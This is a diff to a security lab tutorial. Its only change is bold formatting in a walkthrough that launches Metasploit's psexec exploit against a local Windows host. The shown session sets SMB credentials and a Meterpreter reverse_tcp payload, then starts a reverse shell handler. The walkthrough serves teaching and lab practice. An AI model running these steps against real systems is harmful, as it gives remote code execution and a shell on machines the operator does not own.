@@ -74,24 +74,24 @@ Next, let’s open a new Ubuntu Command Prompt.
 Now we are going to start up and launch Metasploit against the Windows system to get a Meterpreter session.
 
 <pre>
-adhd@DESKTOP-I1T2G01:<b>/mnt/c/Users/adhd$ sudo su -</b>
+adhd@DESKTOP-I1T2G01:/mnt/c/Users/adhd$ <b>sudo su -</b>
 [sudo] password for adhd:
 root@DESKTOP-I1T2G01:~#
-root@DESKTOP-I1T2G01:~# msfconsole -q
+root@DESKTOP-I1T2G01:~# <b>msfconsole -q</b>
 This copy of metasploit-framework is more than two weeks old.
  Consider running 'msfupdate' to update to the latest version.
-msf5 > use exploit/windows/smb/psexec
+msf5 ><b> use exploit/windows/smb/psexec</b>
 msf5 exploit(windows/smb/psexec) >
-msf5 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/psexec) ><b> set PAYLOAD windows/meterpreter/reverse_tcp</b>
 PAYLOAD => windows/meterpreter/reverse_tcp
 msf5 exploit(windows/smb/psexec) >
-msf5 exploit(windows/smb/psexec) > set RHOSTS 172.18.112.1
+msf5 exploit(windows/smb/psexec) ><b> set RHOSTS 172.18.112.1</b>
 RHOSTS => 172.18.112.1
-msf5 exploit(windows/smb/psexec) > set SMBUSER adhd
+msf5 exploit(windows/smb/psexec) ><b> set SMBUSER adhd</b>
 SMBUSER => adhd
-msf5 exploit(windows/smb/psexec) > set SMBPASS adhd
+msf5 exploit(windows/smb/psexec) ><b> set SMBPASS adhd</b>
 SMBPASS => adhd
-msf5 exploit(windows/smb/psexec) > exploit
+msf5 exploit(windows/smb/psexec) ><b> exploit</b>
 
 [*] Started reverse TCP handler on 172.18.121.248:4444
 [*] 172.18.112.1:445 - Connecting to the server...
